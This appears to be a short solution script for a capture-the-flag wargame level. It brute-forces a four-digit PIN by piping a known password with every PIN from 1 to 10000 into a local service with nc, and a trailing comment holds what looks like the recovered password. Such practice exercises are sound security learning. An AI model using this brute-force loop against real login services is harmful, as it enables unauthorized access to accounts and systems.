mkdir /tmp/mytemp
cd /tmp/mytemp
for i in {1..10000}; do echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" >> ./pincodes; done
cat pincodes | nc 127.0.0.1 30002
#uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
